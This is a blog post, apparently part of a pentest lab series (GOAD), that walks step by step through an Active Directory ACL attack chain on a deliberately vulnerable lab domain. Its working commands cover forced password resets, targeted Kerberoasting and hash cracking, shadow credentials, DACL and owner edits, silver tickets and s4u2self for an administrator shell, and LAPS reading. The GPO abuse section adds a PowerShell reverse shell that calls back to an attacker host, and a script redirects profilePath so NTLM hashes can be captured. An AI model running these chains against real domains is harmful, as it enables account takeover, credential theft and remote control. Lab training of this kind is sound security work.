---
layout: post
title:  "GOAD - part 11 - ACL"
category : AD
tags :  AD, Lab
---

On the previous post ([Goad pwning part10]({% link _posts/2022-11-13-GOADv2-pwning-part10.md %})) we did some exploitation by abusing delegation. On this blog post, we will have fun with ACL in the lab.

In active directory, objects right are called Access Control Entries (ACE), a list of ACE is called Access Control List (ACL).

## Lab ACL update

- Before starting this chapter, we will update the users and acl in the labs:
```
sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook ad-data.yml
sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook ad-acl.yml
sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook ad-relations.yml
sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook vulnerabilities.yml
```

- This will change a lot of relations in the lab, because when i initially created the acl i have set a lot of acl on the domain admins group. But the domain admin group is a protected group and those groups are protected by the admin SD protect mechanism.
- So when the lab is build all acl are ok, but one hour later, all the acl related to protected groups and their users are deleted.
- I also add some groups and a vulnerable gpo.

- List of protected groups in the active directory : [https://learn.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)?redirectedfrom=MSDN](https://learn.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)?redirectedfrom=MSDN)

> By default on Active Directory protected groups are reset every hours with the ACL values stored on "CN=AdminSDHolder,CN=System,DC=yourdc" <br>
> Protected groups and Associated users are affected
> - Account Operators
> - Administrator
> - Administrators
> - Backup Operators
> - Domain Admins
> - Domain Controllers
> - Enterprise Admins
> - Krbtgt
> - Print Operators
> - Read-only Domain Controllers
> - Replicator
> - Schema Admins
> - Server Operators
{: .prompt-info }


- The new ACL overview in the lab is this one :

```
MATCH p=(u)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' and u.admincount=false and not tolower(u.name) contains 'key' RETURN p
```

![acl_overview_new.png](/assets/blog/GOAD/acl_overview_new.png)


## sevenkingdoms.local ACL

To start we will focus on the sevenkingdoms killchain of ACL by starting with tywin.lannister (password: powerkingftw135)

- The path here is :
  - Tywin -> Jaime : Change password user
  - Jaime -> Joffrey : Generic Write user
  - Joffrey -> Tyron : WriteDacl on user
  - Tyron -> small council : add member on group
  - Small council -> dragon stone : write owner group to group
  - dragonstone -> kingsguard : write owner to group
  - kingsguard -> stannis : Generic all on User
  - stannis -> kingslanding : Generic all on Computer

![acl_sevenkingdoms.png](/assets/blog/GOAD/acl_sevenkingdoms.png)

- Let's try to do all the path from tywin to kingslanding domain controler :)

> Reminder : Abusing ACL make change on the targets. Be sure to you know what you are doing if you try to exploit it during an audit.
{: .prompt-warning }

## ForceChangePassword on User (Tywin -> Jaime)

- This one should never be done in a pentest (unless the customer is ok with that). You don't want to block a user during your audit. 

- As tywin.lannister we will change jaime.lannister password

![acl_tywin_pss_jaime.png](/assets/blog/GOAD/acl_tywin_pss_jaime.png)

```bash
net rpc password jaime.lannister -U sevenkingdoms.local/tywin.lannister%powerkingftw135 -S kingslanding.sevenkingdoms.local
```

- We set the new jaime password.
- And verify the password is ok.

```bash
cme smb 192.168.56.10 -u jaime.lannister -d sevenkingdoms.local -p pasdebraspasdechocolat
```

![acl_change_password.png](/assets/blog/GOAD/acl_change_password.png)

## GenericWrite on User (Jaime -> Joffrey)

- As we just set up jaime password we will now exploit the GenericWrite from Jaime to Joffrey

![acl_jaime_jeoffrey_genericwrite.png](/assets/blog/GOAD/acl_jaime_jeoffrey_genericwrite.png)

- This could be abuse with 3 different technics :
  - shadowCredentials (windows server 2016 or +)
  - targetKerberoasting (password should be weak enough to be cracked)
  - logonScript (this need a user connection and to be honest it never worked or unless with a script already inside sysvol)


### Target Kerberoasting

- First let's do a target Kerberoasting, the principe is simple. Add an SPN to the user, ask for a tgs, remove the SPN on the user.
- And now we can crack the TGS just like a classic kerberoasting.

- Shutdown have done a tool which do all the work for you : [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)

```bash
targetedKerberoast.py -v -d sevenkingdoms.local -u jaime.lannister -p pasdebraspasdechocolat --request-user joffrey.baratheon
```

![acl_target_kerberoasting.png](/assets/blog/GOAD/acl_target_kerberoasting.png)

- And now just crack the hash

```bash
hashcat -m 13100 -a 0 joffrey.hash rockyou.txt --force
```

![acl_kerberoasting_crack.png](/assets/blog/GOAD/acl_kerberoasting_crack.png)


### Shadow Credentials

This was already done previously in this blog, one of the fastest exploitation is with certipy:

```bash
certipy shadow auto -u jaime.lannister@sevenkingdoms.local -p 'pasdebraspasdechocolat' -account 'joffrey.baratheon'
```

![acl_shadowcreds.png](/assets/blog/GOAD/acl_shadowcreds.png)


### Logon script

- To show the scriptpath ldap value instead of ldapsearch we can use the tool [ldeep](https://github.com/franc-pentest/ldeep)

```bash
ldeep ldap -u jaime.lannister -p 'pasdebraspasdechocolat' -d sevenkingdoms.local -s ldap://192.168.56.10 search '(sAMAccountName=joffrey.baratheon)' scriptpath
```

![acl_show_scriptpath.png](/assets/blog/GOAD/acl_show_scriptpath.png)


- We can change this value with the following script:

```python
import ldap3
dn = "CN=joffrey.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=local"
user = "sevenkingdoms.local\\jaime.lannister"
password = "pasdebraspasdechocolat"
server = ldap3.Server('kingslanding.sevenkingdoms.local')
ldap_con = ldap3.Connection(server = server, user = user, password = password, authentication = ldap3.NTLM)
ldap_con.bind()
ldap_con.modify(dn,{'scriptpath' : [(ldap3.MODIFY_REPLACE, '\\\\192.168.56.1\share\exploit.bat')]})
print(ldap_con.result)
ldap_con.unbind()
```

![acl_modify_ldap_scriptpath.png](/assets/blog/GOAD/acl_modify_ldap_scriptpath.png)

- but sadly this won't work... :'( (if you know why please let me know, this seems to work only if the script is already located in sysvol)

- Another way to abuse the GenericWrite is by changing the profilePath and wait for a connection to get a NetNtlmv2 authentication and relay to another computer or crack it.

- Change the value of profilePath with the following script :

```python
import ldap3
dn = "CN=joffrey.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=local"
user = "sevenkingdoms.local\\jaime.lannister"
password = "pasdebraspasdechocolat"
server = ldap3.Server('kingslanding.sevenkingdoms.local')
ldap_con = ldap3.Connection(server = server, user = user, password = password, authentication = ldap3.NTLM)
ldap_con.bind()
ldap_con.modify(dn,{'profilePath' : [(ldap3.MODIFY_REPLACE, '\\\\192.168.56.1\share')]})
print(ldap_con.result)
ldap_con.unbind()
```

- Start responder and simulate joffrey connection by starting an RDP connection

```bash
responder -I vboxnet0
xfreerdp /d:sevenkingdoms.local /u:joffrey.baratheon /p:'1killerlion' /v:192.168.56.10 /size:80%  /cert-ignore
```

- And we get the NetNLMV2 hash of joffrey.baratheon and... kingslanding$ !

![acl_profilePath.png](/assets/blog/GOAD/acl_profilePath.png)


## WriteDacl on User (Joffrey -> Tyron)

![acl_writedacl_bh.png](/assets/blog/GOAD/acl_writedacl_bh.png)

- To exploit writeDacl from Joffrey to Tyron we can use acledit.py 

- First we will clone the impacket's [fork](https://github.com/ThePorgs/impacket.git) created by shutdown (@_nwodtuhs) to get the last PR with dacledit

```bash
git clone https://github.com/ThePorgs/impacket.git
cd impacket 
python3 setup.py install
```

- Now we can use [dacledit.py](https://www.thehacker.recipes/ad/movement/dacl/grant-rights)

- First let's look at joffrey's right on tyron :

```bash
dacledit.py -action 'read' -principal joffrey.baratheon -target 'tyron.lannister' 'sevenkingdoms.local'/'joffrey.baratheon':'1killerlion'
```

![acl_dacl_read_permission.png](/assets/blog/GOAD/acl_dacl_read_permission.png)

- Ok now change the permission to "FullControl" and see the modification

```bash
dacledit.py -action 'write' -rights 'FullControl' -principal joffrey.baratheon  -target 'tyron.lannister' 'sevenkingdoms.local'/'joffrey.baratheon':'1killerlion'
```

![acl_dacl_writedacl.png](/assets/blog/GOAD/acl_dacl_writedacl.png)

- Ok now we can : 
  - change tyron password
  - do a target kerberoasting
  - do a shadow credentials

- Let's just use shadowcredentials :

```bash
certipy shadow auto -u joffrey.baratheon@sevenkingdoms.local -p '1killerlion' -account 'tyron.lannister'
```

![acl_ritedacl_shadowcreds.png](/assets/blog/GOAD/acl_ritedacl_shadowcreds.png)

## Add self on Group (Tyron -> Small Council)

- We now got tyron so we can add us into the small council group

![acl_addself.png](/assets/blog/GOAD/acl_addself.png)

- First find the distinguished name

```bash
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 search '(sAMAccountName=tyron.lannister)' distinguishedName
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 search '(sAMAccountName=Small Council)' distinguishedName
```

- Add tyron to Small Council

```bash
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 add_to_group "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=Small Council,OU=Crownlands,DC=sevenkingdoms,DC=local"
```

- See the result

```bash
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 membersof 'Small Council'
```

![acl_addself.png](/assets/blog/GOAD/acl_addself.png)

## AddMember on Group (Small Council -> dragonstone)

- Now as tyron we are in the small council, so we can add a member to dragonstone's group.
- So we just add tyron just like we did before

![acl_addmember.png](/assets/blog/GOAD/acl_addmember.png)

```bash
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 add_to_group "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=DragonStone,OU=Crownlands,DC=sevenkingdoms,DC=local"
```

## WriteOwner on Group (dragonstone -> kingsguard)

- Now with the writeOwner privilege we can change the owner of kingsguard to own the group

![acl_write_owner.png](/assets/blog/GOAD/acl_write_owner.png)

- Just like before we will use the impacket [fork](https://github.com/ThePorgs/impacket)

```bash
owneredit.py -action read -target 'kingsguard' -hashes ':b3b3717f7d51b37fb325f7e7d048e998' sevenkingdoms.local/tyron.lannister
owneredit.py -action write -owner 'tyron.lannister' -target 'kingsguard' -hashes ':b3b3717f7d51b37fb325f7e7d048e998' sevenkingdoms.local/tyron.lannister
```

![acl_changeowner.png](/assets/blog/GOAD/acl_changeowner.png)

- And the owner of kingsguard group is now tyron.lannister
- As owner of the group we can now change the acl and give us GenericAll on the group

```bash
dacledit.py -action 'write' -rights 'FullControl' -principal tyron.lannister  -target 'kingsguard' 'sevenkingdoms.local'/'tyron.lannister' -hashes ':b3b3717f7d51b37fb325f7e7d048e998'
```

- With GenericAll now we can add tyron to the kingsguard group

```bash
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 add_to_group "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=kingsguard,OU=Crownlands,DC=sevenkingdoms,DC=local"
```

![acl_writeowner_addgroup.png](/assets/blog/GOAD/acl_writeowner_addgroup.png)

## Generic all on user (kingsguard -> stannis)

- Now tyron is in kingsguard so we can take the control of stannis with the genericAll on stannis

![acl_genericall_group.png](/assets/blog/GOAD/acl_genericall_group.png)

- let's change stannis password with ldeep

```bash
net rpc password stannis.baratheon --pw-nt-hash -U sevenkingdoms.local/tyron.lannister%b3b3717f7d51b37fb325f7e7d048e998 -S kingslanding.sevenkingdoms.local
```

- We will set the password `Drag0nst0ne` (i know it is the same as before but i didn't want to change the screenshots in the next part :p )

## GenericAll on Computer (Stannis -> kingslanding)

- Now we own stannis, let's finish the domain with the generic Write on the DC

![acl_genericwrite_computer.png](/assets/blog/GOAD/acl_genericwrite_computer.png)

- We already done that on the previous chapter. One way to abuse of this permission is by using Resource Based Constrained Delegation ([Goad pwning part10]({% link _posts/2022-11-13-GOADv2-pwning-part10.md %}))

- But what if you can't add a computer in the domain (more and more customers disable the ability for a simple user to add computer to the domains and this is a good practice from a security point of view), you can do a shadow credentials attack on the computer.

- So if ADCS is enabled on the domain, and we got write privilege on msDS-KeyCredentialLink, we can do the shadow credentials attack to get a direct access on the target account. (just like what we did in [Goad pwning part5]({% link _posts/2022-07-20-GOADv2-pwning-part5.md %}))

- Shadow credentials is now include with certipy (this attack can also be done with [pywisker](https://github.com/ShutdownRepo/pywhisker) )

```bash
certipy shadow auto -u stannis.baratheon@sevenkingdoms.local -p 'Drag0nst0ne' -account 'kingslanding$'
```

![acl_shadow_creds_computer.png](/assets/blog/GOAD/acl_shadow_creds_computer.png)

- Now we got the tgt and the NT hash of kingslanding$
- Obviously we can do a dcsync because kingslanding is a DC, but instead let's try to directly get a shell

- To do that the easiest way is using s4u2self abuse or create a silver ticket

### machine account to administrator shell

#### s4u2self abuse

- s4u2self abuse : we ask for a TGS as the Administrator domain user

```
export KRB5CCNAME=/workspace/acl/kingslanding.ccache
getST.py -self -impersonate "Administrator" -altservice "cifs/kingslanding.sevenkingdoms.local" -k -no-pass -dc-ip 192.168.56.10 "sevenkingdoms.local"/'kingslanding$'
```

- And than we use that ticket to connect as administrator

```bash
export KRB5CCNAME=/workspace/acl/Administrator@cifs_kingslanding.sevenkingdoms.local@SEVENKINGDOMS.LOCAL.ccache
wmiexec.py -k -no-pass sevenkingdoms.local/administrator@kingslanding.sevenkingdoms.local
```

![acl_s4u2self_abuse.png](/assets/blog/GOAD/acl_s4u2self_abuse.png)


#### Silver ticket

- Another way to get a shell is by creating a silver ticket :

- Find the domain SID:

```bash
lookupsid.py -hashes ':33a43e326dad53a516dc06393281d2cc' 'sevenkingdoms.local'/'kingslanding$'@kingslanding.sevenkingdoms.local 0
```

![acl_lokupsid.png](/assets/blog/GOAD/acl_lokupsid.png)


- Create the silver ticket:

```bash
ticketer.py -nthash '33a43e326dad53a516dc06393281d2cc' -domain-sid 'S-1-5-21-1409754491-4246775990-3914137275' -domain sevenkingdoms.local -spn cifs/kingslanding.sevenkingdoms.local Administrator
```

- And use it :

```bash
export KRB5CCNAME=/workspace/acl/Administrator.ccache
wmiexec.py -k -no-pass sevenkingdoms.local/administrator@kingslanding.sevenkingdoms.local
```

![acl_silverticket.png](/assets/blog/GOAD/acl_silverticket.png)


Ok the fun with sevenkingdoms.local domain is over, now let's try some acl in the other domains.

## GPO abuse

- There is a GPO abuse on the north domain

![acl_gpo_abuse.png](/assets/blog/GOAD/acl_gpo_abuse.png)

- To abuse GPO we will use the project created by Hackndo : [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse)
- The github readme file say : _"It will create an immediate scheduled task as SYSTEM on the remote computer for computer GPO, or as logged in user for user GPO."_

```bash
git clone https://github.com/Hackndo/pyGPOAbuse.git
python3 -m virtualenv .venv
source .venv/bin/activate
python3 -m pip install -r requirements.txt
```

- We get the id from bloodhound and launch the exploit with :

```bash
python3 pygpoabuse.py north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -gpo-id "6F8BD644-2C29-418C-93F1-FE926F91F6B4"
```

![acl_gpo_abuse_schedule_task.png](/assets/blog/GOAD/acl_gpo_abuse_schedule_task.png)

- If we take a look in the windows GUI we will see the schedule task created :

![acl_gpo_abuse_schedule_task_result.png](/assets/blog/GOAD/acl_gpo_abuse_schedule_task_result.png)

- If we wait few minutes or if we run a `gpudate /force` we will see the new local admin user

![acl_gpo_abuse_schedule_task_adduser.png](/assets/blog/GOAD/acl_gpo_abuse_schedule_task_adduser.png)


- Now let's try to get a powershell reverseshell

```bash
python3 pygpoabuse.py north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -gpo-id "6F8BD644-2C29-418C-93F1-FE926F91F6B4" -powershell -command "\$c = New-Object System.Net.Sockets.TCPClient('192.168.56.1',4444);\$s = \$c.GetStream();[byte[]]\$b = 0..65535|%{0};while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0){    \$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0, \$i);    \$sb = (iex \$d 2>&1 | Out-String );    \$sb = ([text.encoding]::ASCII).GetBytes(\$sb + 'ps> ');    \$s.Write(\$sb,0,\$sb.Length);    \$s.Flush()};\$c.Close()" -taskname "MyTask" -description "don't worry"
```

- And a few moments later we get the powershell reverseshell

![acl_gpo_abuse_rev_shell.png](/assets/blog/GOAD/acl_gpo_abuse_rev_shell.png)

> pyGPOAbuse is changing the GPO without going back !
> Do not use in production or at your own risk and do not forget to cleanup after
{: .prompt-warning }

- Cleanup 

![acl_gpo_cleanup.png](/assets/blog/GOAD/acl_gpo_cleanup.png)

## Read Laps password

![acl_read_laps.png](/assets/blog/GOAD/acl_read_laps.png)

- To read LAPS password, the easy way is with the cme module

```bash
cme ldap 192.168.56.12 -d essos.local -u jorah.mormont -p 'H0nnor!' --module laps
```

![acl_read_laps_cme.png](/assets/blog/GOAD/acl_read_laps_cme.png)

- Works like a charm :)

## Resources: 

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.thehacker.recipes/ad/movement/dacl](https://www.thehacker.recipes/ad/movement/dacl)
- [https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse)
- [https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)


Next time, this will be the last blog post of the GOAD writeup series. And it will be on Trusts exploitation ([Goad pwning part12]({% link _posts/2022-12-21-GOADv2-pwning-part12.md %}))